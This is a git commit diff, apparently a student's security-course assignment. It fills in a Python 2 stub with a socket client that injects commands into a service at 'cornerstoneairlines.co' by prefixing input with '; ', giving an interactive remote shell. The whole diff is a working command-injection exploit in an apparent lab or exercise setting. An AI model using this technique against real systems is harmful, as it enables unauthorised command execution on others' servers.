20f8d58183808f75a19ecd9502b10213924864e5
Varsha-Reddy <42913716+Varsha-Reddy@users.noreply.github.com>
2018-09-28 12:15:51 -0400

    Update stub.py

--- week/4/stub.py
+++ week/4/stub.py
@@ -1,12 +1,3 @@
-"""
-    Use the same techniques such as (but not limited to):
-        1) Sockets
-        2) File I/O
-        3) raw_input()
-
-    from the OSINT HW to complete this assignment. Good luck!
-"""
-
 import socket
 
 host = "cornerstoneairlines.co" # IP address here
@@ -16,22 +7,43 @@ def execute_cmd(cmd):
     """
         Sockets: https://docs.python.org/2/library/socket.html
         How to use the socket s:
-
+    """
+    if "shell" in cmd:
+        io = raw_input("/> ")
+        cd = ""
+        current = "/"
+        previous = ""
+        
+        while ("exit") not in io:
             # Establish socket connection
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, port))
 
-            Reading:
+            if "cd" in io:
+                cd = io
+                previous = current
+                current = io.partition("cd ")[2]
+            data = s.recv(1024)
+            
+            if "/" not in current:
+                move = "; "+cd+"; "+io+'\n'
+            else:
+                move = "; "+io+'\n'
+            s.send(move)
+            data = s.recv(1024)
+            print(data)
+            io = raw_input(current +"> ")
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
-
-            Sending:
-
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
+        s.close()
+        execute_cmd(raw_input("> "))
+    elif "help" in cmd:
+        print(" 1. shell Drop into an interactive shell and allow users to gracefully exit \n 2. pull <remote-path> <local-path> Download files \n 3. help shows this help menu \n 3. quit Quit the shell \n")
+        execute_cmd(raw_input("> "))
+    elif "quit" in cmd:
+        exit(0)
+    else:
+        exit(0)
 
 
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+    execute_cmd(raw_input("> "))
